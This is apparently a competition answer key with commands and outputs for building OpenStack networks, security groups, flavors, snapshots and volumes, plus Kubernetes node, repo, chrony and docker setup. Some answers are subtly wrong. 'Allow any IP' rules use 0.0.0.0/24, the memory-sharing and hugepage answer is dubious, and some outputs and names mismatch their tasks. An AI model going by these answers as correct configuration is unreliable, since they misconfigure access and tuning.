7.搭建网络组件并初始化网络在controller节点和compute节点分别执行iaas-install-neutron-controller.sh和iaas-install-neutron-compute.sh脚本，会自行安装neutron 服务并完成配置。创建云主机外部网络ext-net，子网为ext-subnet，云主机浮动IP可用网段为192.168.10.100192.168.10.200，网关为192.168.10.1。创建云主机内部网络int-net1，子网为int-subnet1，云主机子网IP可用网段为10.0.0.10010.0.0.200，网关为10.0.0.1;创建云主机内部网络int-net2，子网为int-subnet2，云主机子网IP可用网段为10.0.1.100 ~10.0.1.200，网关为10.0.1.1。添加名为ext-router的路由器，添加网关在ext-net网络，添加内部端口到int-net1 网络，完成内部网络int-net1和外部网络的连通。
请使用openstack命令完成以上任务，完成后将命令和返回结果提交至答题框。【3分】
#在两个节点使用对应的脚本#创建外部网络并绑定网段openstack network create ext-net --provider-physical-network provider --external --enable-port-security --enable  --provider-network-type flat+---------------------------+--------------------------------------+| Field                     | Value                                |+---------------------------+--------------------------------------+| admin_state_up            | UP                                   || availability_zone_hints   |                                      || availability_zones        |                                      || created_at                | 2022-10-09T02:59:57Z                 || description               |                                      || dns_domain                | None                                 || id                        | 01fb1dc8-66f3-4045-84dc-cdc0cb69bede || ipv4_address_scope        | None                                 || ipv6_address_scope        | None                                 || is_default                | False                                || is_vlan_transparent       | None                                 || mtu                       | 1500                                 || name                      | ext-net                              || port_security_enabled     | True                                 || project_id                | e6dc2936211947c3b924187b48ffa8fb     || provider:network_type     | flat                                 || provider:physical_network | provider                             || provider:segmentation_id  | None                                 || qos_policy_id             | None                                 || revision_number           | 5                                    || router:external           | External                             || segments                  | None                                 || shared                    | False                                || status                    | ACTIVE                               || subnets                   |                                      || tags                      |                                      || updated_at                | 2022-10-09T02:59:57Z                 |+---------------------------+--------------------------------------+openstack subnet create ext-subnet --network ext-net  --dhcp --gateway 192.168.10.1  --subnet-range 192.168.10.0/24 --allocation-pool start=192.168.10.100,end=192.168.10.200+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| allocation_pools  | 192.168.10.100-192.168.10.200        || cidr              | 192.168.10.0/24                      || created_at        | 2022-10-09T03:01:56Z                 || description       |                                      || dns_nameservers   |                                      || enable_dhcp       | True                                 || gateway_ip        | 192.168.10.1                         || host_routes       |                                      || id                | 4b633ced-be54-4af4-a536-8f94f0c694bf || ip_version        | 4                                    || ipv6_address_mode | None                                 || ipv6_ra_mode      | None                                 || name              | ext-subnet                           || network_id        | 01fb1dc8-66f3-4045-84dc-cdc0cb69bede || project_id        | e6dc2936211947c3b924187b48ffa8fb     || revision_number   | 0                                    || segment_id        | None                                 || service_types     |                                      || subnetpool_id     | None                                 || tags              |                                      || updated_at        | 2022-10-09T03:01:56Z                 |+-------------------+--------------------------------------+#创建内网1，内网2并绑定openstack network create --internal int-net1+---------------------------+--------------------------------------+| Field                     | Value                                |+---------------------------+--------------------------------------+| admin_state_up            | UP                                   || availability_zone_hints   |                                      || availability_zones        |                                      || created_at                | 2022-10-09T03:02:27Z                 || description               |                                      || dns_domain                | None                                 || id                        | 43b5b4a9-1846-4489-8521-acdf2f96453e || ipv4_address_scope        | None                                 || ipv6_address_scope        | None                                 || is_default                | False                                || is_vlan_transparent       | None                                 || mtu                       | 1450                                 || name                      | int-net1                             || port_security_enabled     | True                                 || project_id                | e6dc2936211947c3b924187b48ffa8fb     || provider:network_type     | vxlan                                || provider:physical_network | None                                 || provider:segmentation_id  | 161                                  || qos_policy_id             | None                                 || revision_number           | 2                                    || router:external           | Internal                             || segments                  | None                                 || shared                    | False                                || status                    | ACTIVE                               || subnets                   |                                      || tags                      |                                      || updated_at                | 2022-10-09T03:02:27Z                 |+---------------------------+--------------------------------------+[root@controller ~]# openstack network create --internal int-net2+---------------------------+--------------------------------------+| Field                     | Value                                |+---------------------------+--------------------------------------+| admin_state_up            | UP                                   || availability_zone_hints   |                                      || availability_zones        |                                      || created_at                | 2022-10-09T03:02:31Z                 || description               |                                      || dns_domain                | None                                 || id                        | ea39aff1-bd51-443b-83e9-c573812a1dd7 || ipv4_address_scope        | None                                 || ipv6_address_scope        | None                                 || is_default                | False                                || is_vlan_transparent       | None                                 || mtu                       | 1450                                 || name                      | int-net2                             || port_security_enabled     | True                                 || project_id                | e6dc2936211947c3b924187b48ffa8fb     || provider:network_type     | vxlan                                || provider:physical_network | None                                 || provider:segmentation_id  | 195                                  || qos_policy_id             | None                                 || revision_number           | 2                                    || router:external           | Internal                             || segments                  | None                                 || shared                    | False                                || status                    | ACTIVE                               || subnets                   |                                      || tags                      |                                      || updated_at                | 2022-10-09T03:02:31Z                 |+---------------------------+--------------------------------------+[root@controller ~]# openstack subnet create int-subnet1 --network int-net1  --dhcp --gateway 10.0.0.1  --subnet-range 10.0.0.0/24 --allocation-pool start=10.0.0.100,end=10.0.0.200+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| allocation_pools  | 10.0.0.100-10.0.0.200                || cidr              | 10.0.0.0/24                          || created_at        | 2022-10-09T03:05:35Z                 || description       |                                      || dns_nameservers   |                                      || enable_dhcp       | True                                 || gateway_ip        | 10.0.0.1                             || host_routes       |                                      || id                | d56b1e12-c37a-4ba1-9323-249b0e74e8b3 || ip_version        | 4                                    || ipv6_address_mode | None                                 || ipv6_ra_mode      | None                                 || name              | int-subnet1                          || network_id        | 43b5b4a9-1846-4489-8521-acdf2f96453e || project_id        | e6dc2936211947c3b924187b48ffa8fb     || revision_number   | 0                                    || segment_id        | None                                 || service_types     |                                      || subnetpool_id     | None                                 || tags              |                                      || updated_at        | 2022-10-09T03:05:35Z                 |+-------------------+--------------------------------------+[root@controller ~]# openstack subnet create int-subnet2 --network int-net2  --dhcp --gateway 10.0.1.1  --subnet-range 10.0.1.0/24 --allocation-pool start=10.0.1.100,end=10.0.1.200+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| allocation_pools  | 10.0.1.100-10.0.1.200                || cidr              | 10.0.1.0/24                          || created_at        | 2022-10-09T03:06:02Z                 || description       |                                      || dns_nameservers   |                                      || enable_dhcp       | True                                 || gateway_ip        | 10.0.1.1                             || host_routes       |                                      || id                | 3c8fbeb8-c4ec-41d4-b2d2-eac146b82eac || ip_version        | 4                                    || ipv6_address_mode | None                                 || ipv6_ra_mode      | None                                 || name              | int-subnet2                          || network_id        | ea39aff1-bd51-443b-83e9-c573812a1dd7 || project_id        | e6dc2936211947c3b924187b48ffa8fb     || revision_number   | 0                                    || segment_id        | None                                 || service_types     |                                      || subnetpool_id     | None                                 || tags              |                                      || updated_at        | 2022-10-09T03:06:02Z                 |+-------------------+--------------------------------------+#创建路由，并联通外部[root@controller ~]# openstack router create ext-router --enable+-------------------------+--------------------------------------+| Field                   | Value                                |+-------------------------+--------------------------------------+| admin_state_up          | UP                                   || availability_zone_hints |                                      || availability_zones      |                                      || created_at              | 2022-10-09T03:07:38Z                 || description             |                                      || distributed             | False                                || external_gateway_info   | None                                 || flavor_id               | None                                 || ha                      | False                                || id                      | b6ec9db2-2a00-438f-bd07-fa433647d0d4 || name                    | ext-router                           || project_id              | e6dc2936211947c3b924187b48ffa8fb     || revision_number         | 1                                    || routes                  |                                      || status                  | ACTIVE                               || tags                    |                                      || updated_at              | 2022-10-09T03:07:38Z                 |+-------------------------+--------------------------------------+[root@controller ~]# openstack router set ext-router --external-gateway ext-net  --enable-snat[root@controller ~]# openstack router  add subnet ext-router int-subnet1

任务3 OpenStack运维任务1.使用openstack图形界面创建镜像，镜像名称为nginx,源使用nginx-centos.qcow2请将镜像截图提交至答题框。【1分】

操作步骤：
登录OpenStack，创建镜像，源镜像为nginx-centos.qcow2，名臣为nginx，创建完成

⒉.使用命令创建名称为group_web的安全组该安全组的描述为工位号，为该安全组添加规则允许任意ip地址访问web,并写出添加访问SSH (22)的命令。请将添加访问SSH (22)的命令提交至答题框。【1分】
[root@controller ~]# openstack security group rule create group_web --ingress  --dst-port 22:22 --remote-ip 0.0.0.0/24+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| created_at        | 2022-10-09T03:48:08Z                 || description       |                                      || direction         | ingress                              || ether_type        | IPv4                                 || id                | 03c7ce48-4ada-4f9d-bd0c-c80454d57f94 || name              | None                                 || port_range_max    | 22                                   || port_range_min    | 22                                   || project_id        | e6dc2936211947c3b924187b48ffa8fb     || protocol          | tcp                                  || remote_group_id   | None                                 || remote_ip_prefix  | 0.0.0.0/24                           || revision_number   | 0                                    || security_group_id | 9c74fd04-d37a-4501-9632-05d82388ac59 || updated_at        | 2022-10-09T03:48:08Z                 |+-------------------+--------------------------------------+

过程：
#创建安全组group_webopenstack security group create group_web --project demo --description 31#允许任意ip访问webopenstack security group rule create group_web --ingress  --dst-port 80:80 --remote-ip 0.0.0.0/24 --protocol tcpopenstack security group rule create group_web --ingress  --dst-port 443:443 --remote-ip 0.0.0.0/24 --protocol tcp#允许访问22端口openstack security group rule create group_web --ingress  --dst-port 22:22 --remote-ip 0.0.0.0/24

3.创建名为nginx的云主机类型，要求VCPU 1内存1024M根磁盘10G请将openstack命令提交至答题框。【1分】
[root@controller ~]# nova flavor-create nginx 1 1024 10 1+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| ID | Name  | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| 1  | nginx | 1024      | 10   | 0         |      | 1     | 1.0         | True      | -           |+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+

5.修改相关配置，关闭nginx云主机的系统的内存共享，打开透明大页，并且保证nginx云主机的安全，配置禁止其他节点可以ping它请将sysctl -p命令的返回结果提交至答题框。【1分】

过程：
vi /etc/sysctl.confkernel.shmmax = 0kernel.shmall = 0kernel.shmmni = 0 net.ipv4.icmp_echo_ignore_all = 1

6.通过ceilometer组件，使用命令行查询nginx云主机CPU使用情况。请将gnocchi metric list命令的返回结果提交至答题框。【1分】
ceilometer meter-list +---------------------------------------------+------------+-----------+-----------------------------------------------------------------------+----------------------------------+----------------------------------+| Name                                        | Type       | Unit      | Resource ID                                                           | User ID                          | Project ID                       |+---------------------------------------------+------------+-----------+-----------------------------------------------------------------------+----------------------------------+----------------------------------+| cpu                                         | cumulative | ns        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || cpu_util                                    | gauge      | %         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.allocation                             | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.capacity                               | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.allocation                      | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.capacity                        | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.read.bytes                      | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.read.bytes.rate                 | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.usage                           | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.write.bytes                     | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.device.write.bytes.rate                | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.read.bytes                             | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.read.bytes.rate                        | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.read.requests                          | cumulative | request   | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.read.requests.rate                     | gauge      | request/s | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.total.size                             | gauge      | GB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.usage                                  | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.write.bytes                            | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.write.bytes.rate                       | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.write.requests                         | cumulative | request   | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || disk.write.requests.rate                    | gauge      | request/s | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || instance                                    | gauge      | instance  | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || memory                                      | gauge      | MB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || memory.usage                                | gauge      | MB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.bytes                      | cumulative | B         | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.bytes.rate                 | gauge      | B/s       | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.packets                    | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.packets.drop               | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.packets.error              | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.incoming.packets.rate               | gauge      | packet/s  | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.bytes                      | cumulative | B         | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.bytes.rate                 | gauge      | B/s       | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.packets                    | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.packets.drop               | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.packets.error              | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || network.outgoing.packets.rate               | gauge      | packet/s  | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || poweron                                     | gauge      | N/A       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 || vcpus                                       | gauge      | vcpu      | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |

过程：
#分别安装ceilometer组件controller： iaas-install-ceilometer-controller.shcompute: iaas-install-ceilometer-compute.sh



7.使用命令行创建云主机nginx快照，命名为nginx_snap,使用qemu相关命令查询该快照磁盘详细属性。请将qemu-img info nginx_snap.qcow2命令的返回结果提交至答题框。【2分】
[root@controller images]# qemu-img info 5eae1a37-7ae9-4c4a-98c5-f477183eb818image: 5eae1a37-7ae9-4c4a-98c5-f477183eb818file format: qcow2virtual size: 10G (10737418240 bytes)disk size: 1.7Gcluster_size: 65536Format specific information:    compat: 1.1    lazy refcounts: false    refcount bits: 16    corrupt: false

过程：
#查看云主机idnova list#创建快照nova image-create b8095ceb-005c-4ca8-88be-dbdd7bec39ac &quot;nginx_snap&quot;#进入后端cd /var/lib/glance/images#查看快照的id后，查看详细属性qemu-img info 5eae1a37-7ae9-4c4a-98c5-f477183eb818



8.执行iaas-install-cinder-controller .sh和iaas-install-cinder-compute.sh脚本，在controller和compute节点上安装cinder服务并完成配置，创建一个名为lvm的卷类型，创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源。创建一块带这个卷类型标识的云硬盘lvm_test，查询该云硬盘的详细信息。请将cinder show lvm_test命令的返回结果提交至答题框。【2分】
9.将该云硬盘挂载到nginx云主机中，将该云硬盘格式化为xfs。永久挂载至&#x2F;opt目录，创建一个文件文件名为工位号内容为工位号。请将cat &#x2F;etc&#x2F;fstab的返回结果提交至答题框。【1分】
过程：
#绑定nginx主机openstack server  add volume nginx test_lvm#将云硬盘格式化为xfsmkfs.xfs /dev/vdb#永久挂在vi /etc/fstab/dev/vdb /opt xfs     defaults        0 0



10.编写server_volume.yaml文件，通过heat组件实现自动化部署:发放1台云主机，主机名称为my server_1，镜像为nginx，云主机类型为nginx，网络为int-net1，创建大小为1G的云硬盘，挂载至my_server_1将server_volume.yaml文件中的内容提交至答题框。【3分】
B场次题目:容器的编排与运维


设备名称
主机名
接口
IP地址



虚拟机1
master
ens33
192.168.200.162


虚拟机2
node1
ens33
192.168.200.163


虚拟机3
node2
ens33
192.168.200.164


虚拟机4
node3
ens33
192.168.200.165


任务1 容器云平台环境初始化（5分）1.容器云平台的初始化根据表2中的IP地址规划，创建云服务器，镜像使用CentOS_7.5_x86_64_XD.qcow，确保网络正常通信。按照表1设置主机名节点并关闭swap，同时永久关闭selinux以及防火墙,并修改hosts映射。
请将master节点hosts文件内容提交至答题框。【1分】
vi /etc/hosts192.168.200.162 master192.168.200.163 node1192.168.200.164 node2192.168.200.165 harbor

过程：
master
其他节点修改主机名即可，其他命令相同
hostnamectl set-hostname mastersetenforce 0vi /etc/selinux/config   SELINUX=disabledswapoff -asystemctl stop firewalldsystemctl disable firewalld vi /etc/hosts192.168.200.162 master192.168.200.163 node1192.168.200.164 node2192.168.200.165 harbor

2.Yum源数据的持久化挂载将提供的CentOS-7-x86_64-DVD-1804.iso和bricsskills_cloud_paas.iso光盘镜像移动到master节点&#x2F;root目录下，然后在&#x2F;opt目录下使用命令创建&#x2F;centos目录和&#x2F;paas目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso永久挂载到&#x2F;centos目录下，将镜像文件bricsskills_cloud_paas.iso永久挂载到&#x2F;paas目录下。
请将cat &#x2F;etc&#x2F;fstab的返回结果提交到答题框。【1分】
若无bricsskills_cloud_paas.iso使用chinaskil也可以
cat /etc/fstab/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0

过程：
mkdir /opt/centosmkdir /opt/paasmount CentOS-7-x86_64-DVD-1804.iso  /opt/centosmount chinaskills_cloud_paas.iso /opt/paasvi /etc/fstab/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0mount -a

3.Yum源的编写为master节点设置本地yum源，yum源文件名为local.repo，安装ftp服务，将ftp仓库设置为&#x2F;opt&#x2F;，为node1节点和node2节点配置ftp源,yum源文件名称为ftp.repo，其中ftp服务器地址为master节点,配置ftp源时不要写IP地址。
请将ftp.repo文件中的内容提交到答题框。【1分】
vi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://master/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=ftp://master/paas/kubernetes-repogpgcheck=0enabled=1

过程：
master
mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/centos.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=file:///opt/paas/kubernetes-repogpgcheck=0enabled=1#安装vsftpd服务yum install -y vsftpdvi /etc/vsftpd/vsftpd.conf  anon_root=/opt/systemctl start vsftpdsystemctl enable vsftpdiptables -Fiptables -Xiptables -Z/usr/sbin/iptables-save

其他节点
mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://master/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=ftp://master/paas/kubernetes-repogpgcheck=0enabled=1iptables -Fiptables -Xiptables -Z/usr/sbin/iptables-save

4.设置时间同步服务器在master节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动;在其他节点上指定master节点为上游NTP服务器，重启服务并设为开机启动。
请在master节点将cat &#x2F;etc&#x2F;chrony.conf | grep server命令的返回结果提交到答题框。【1分】
[root@master ~]# cat /etc/chrony.conf | grep server# Use public servers from the pool.ntp.org project.#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst

过程：
master
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingallow 10.0.0.0/24local stratum 10systemctl restart chronydsystemctl enable chronyd

其他节点
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingsystemctl restart chronydsystemctl enable chronyd

5.设置免密登录为四台服务器设置免密登录，保证服务器之间能够互相免密登录。
请将免密登录的命令提交到答题框。【1分】
ssh-keygen ssh-copy-id root@192.168.200.163ssh-copy-id root@192.168.200.164ssh-copy-id root@192.168.200.165

任务2 k8s搭建任务(10分)1.安装docker应用在所有节点上安装dokcer-ce。安装完成后修改docker启动引擎为systemd并配置阿里云镜像加速地址，配置成功重启docker服务器。
请将docker version命令的返回结果提交到答题框。【1分】
[root@master ~]# docker versionClient: Docker Engine - Community Version:           19.03.13 API version:       1.40 Go version:        go1.13.15 Git commit:        4484c46d9d Built:             Wed Sep 16 17:03:45 2020 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          19.03.13  API version:      1.40 (minimum version 1.12)  Go version:       go1.13.15  Git commit:       4484c46d9d  Built:            Wed Sep 16 17:02:21 2020  OS/Arch:          linux/amd64  Experimental:     false containerd:  Version:          1.3.7  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175 runc:  Version:          1.0.0-rc10  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd docker-init:  Version:          0.18.0  GitCommit:        fec3683

过程：
#安装依赖yum install -y yum-utils lvm2 device-mapper-*#安装docker-ceyum install -y docker-cesystemctl start dockersystemctl enable docker#修改相关配置tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;&quot;registry-mirrors&quot;: [&quot;https://5twf62k1.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;EOFsystemctl restart docker

2.安装docker-compose在Harbor节点上使用&#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_6下的文件安装docker-compose。安装完成后执行docker-composeversion命令。
请将docker-compose versio命令返回结果提交到答题框。【0.5分】
[root@harbor ~]# docker-compose versiondocker-compose version 1.25.5, build 8a1c60f6docker-py version: 4.1.0CPython version: 3.7.5OpenSSL version: OpenSSL 1.1.0l  10 Sep 2019

过程：
#可将master节点的docker-compose文件传到harborcp -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composedocker-compose version

3.搭建horbor仓库在Harbor节点使用&#x2F;opt&#x2F;paas&#x2F;harbor&#x2F; harbor-offline-installer-v2.1.0.tgz离线安装包，安装harbor仓库，并修改各节点默认docker仓库为harbor仓库地址。
请将master节点daemon.json中的内容提交到答题框。【2分】
cat /etc/docker/daemon.json&#123;  &quot;insecure-registries&quot; : [&quot;192.168.200.165:5000&quot;],&quot;registry-mirrors&quot;: [&quot;https://5twf62k1.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;

过程：
harbor：
